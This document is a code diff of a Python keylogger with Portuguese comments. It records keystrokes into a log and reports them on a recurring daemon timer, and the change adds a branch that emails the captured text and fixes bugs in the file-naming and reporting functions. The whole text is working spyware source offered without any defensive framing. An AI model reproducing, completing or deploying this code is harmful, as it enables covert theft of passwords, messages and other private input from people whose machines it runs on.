@@ -35,25 +35,27 @@ def callback(self, event):
             name = f"[{name.upper()}]"
     self.log += name #self.log vai receber ele + a variavel name
 
-def enviar_arquivo(self):
+def update_filename(self):
     detector = str(self.detector)[-7].replace(" ", "-").replace(":" , " ") #definindo os espaços para o nome do arquivo
     detectorenc = str(self.detectorenc)[:-7].replace(" ", "-").replace(":", "") #encerrar detector
     self.filename = f"keylog-{detector}_{detectorenc}"
-def inserir_no_arquivo(self):
+def report_to_file(self):
     with open(f"{self.filename}.txt", "w") as f: #abrir e gerar um arquivo em modo de escrita
         print(self.log, file=f)
     print(f"[+]Salvo {self.filename}.txt")
 
 def report(self):
     if self.log: #se o arquivo receber algo, constar
-        detectorenc = datetime.now()
+        self.detectorenc = datetime.now()
         self.update_filename()
-    elif self.report_method == "file":
-        self.report_to_file()
-    print(f"[{self.filename}] - {self.log}") #nao reportar no terminal
-    self.detector = datetime.now()
+        if self.report_method == "email":
+            self.sendmail()
+        elif self.report_method == "file":
+             self.report_to_file()
+        print(f"[{self.filename}] - {self.log}") #nao reportar no terminal
+        self.detector = datetime.now()
     self.log = ""
-    timer = timer(interval = self.interval, function=self.report)
+    timer = Timer(interval = self.interval, function=self.report)
     timer.daemon = True
     timer.start()
     
